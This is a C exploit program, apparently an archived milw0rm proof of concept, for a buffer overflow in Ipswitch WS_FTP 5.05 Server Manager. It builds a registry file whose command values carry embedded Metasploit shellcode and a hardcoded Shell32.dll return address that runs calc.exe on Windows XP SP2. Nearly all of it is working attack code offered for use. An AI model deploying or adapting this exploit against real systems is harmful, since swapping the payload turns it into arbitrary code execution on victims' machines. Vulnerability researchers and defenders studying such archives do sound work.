/****************************************************************************
*      Ipswitch WS_FTP 5.05 Server Manager Local Site Buffer Overflow       *
*                                                                           *
*                                                                           *
* There's a buffer overflow in iftpmgr.exe that can be triggered by         *
* registering a long site command. The result is then saved in the registry *
* and every time the group is checked the bug appears.                      *
* This exploit launches calc.exe.                                           *
*                                                                           *
* Tested against Win XP SP2 FR.                                             *
* Have Fun!                                                                 *
*                                                                           *
* Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>                *
****************************************************************************/

#include "stdio.h"
#include "stdlib.h"

/* win32_exec -  EXITFUNC=process CMD=calc.exe Size=165 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char CalcShellcode[] =
"\x29\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x26"
"\x45\x32\xe3\x83\xeb\xfc\xe2\xf4\xda\xad\x76\xe3\x26\x45\xb9\xa6"
"\x1a\xce\x4e\xe6\x5e\x44\xdd\x68\x69\x5d\xb9\xbc\x06\x44\xd9\xaa"
"\xad\x71\xb9\xe2\xc8\x74\xf2\x7a\x8a\xc1\xf2\x97\x21\x84\xf8\xee"
"\x27\x87\xd9\x17\x1d\x11\x16\xe7\x53\xa0\xb9\xbc\x02\x44\xd9\x85"
"\xad\x49\x79\x68\x79\x59\x33\x08\xad\x59\xb9\xe2\xcd\xcc\x6e\xc7"
"\x5C\x22\x86\x03\x23\x42\xce\x72\xd3\xa3\x85\x4a\xef\xad\x05\x3e"
"\x68\x56\x59\x9f\x68\x4e\x4d\xd9\xea\xad\xc5\x82\xe3\x26\x45\xb9"
"\x8b\x1a\x1a\x03\x15\x46\x13\xbb\x1b\xa5\x85\x49\xb3\x4e\x3b\xea"
"\x01\x55\x2d\xaa\x1d\xac\x4b\x65\x1c\xc1\x26\x53\x8f\x45\x6b\x57"
"\x9b\x43\x45\x32\xe3";

int main(int argc, char* argv[])
{
	FILE* regfile;
	char evilbuff[250];

	printf("[+] Ipswitch WS_FTP 5.05 Server Manager Local Site Buffer Overflow\n");
	printf("[+] Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>\n");
	if (argc!=3) {
		printf("[+] Usage: %s <Group> <file.reg>\n",argv[0]);
		printf("[+] ex:    %s Marsu Pilami.reg\n",argv[0]);
		return 0;
	}
	
	memset(evilbuff,'C',250);
	memcpy(evilbuff+4,CalcShellcode,strlen(CalcShellcode));
	memcpy(evilbuff+202,"\x46\xE4\xBD\x7C",4);	/*00 50 00 00 in Shell32.dll. We need this to jump back to our shellcode =)
							  CALL DWORD PTR DS:[EDX+90] and our code is at 0x00500040 in DS*/
	memset(evilbuff+215,0,1);
	
	regfile=fopen(argv[2],"wb");
	fprintf(regfile,"Windows Registry Editor Version 5.00\r\n\r\n");
	fprintf(regfile,"[HKEY_LOCAL_MACHINE\\SOFTWARE\\Ipswitch\\iFtpSvc\\Domains\\%s\\Commands]\r\n\r\n",argv[1]);
	fprintf(regfile,"[HKEY_LOCAL_MACHINE\\SOFTWARE\\Ipswitch\\iFtpSvc\\Domains\\%s\\Commands\\aa]\r\n\"_Executable\"=\"%s\"\r\n",argv[1],evilbuff);
	fprintf(regfile,"\"_Arguments\"=\"%s\"\r\n",evilbuff);
	fprintf(regfile,"\"*everyone\"=dword:000000ff\r\n\r\n");
	fclose(regfile);
	printf("[+] Done. Have fun!\n");
	return 0;
	
}

// milw0rm.com [2007-04-02]
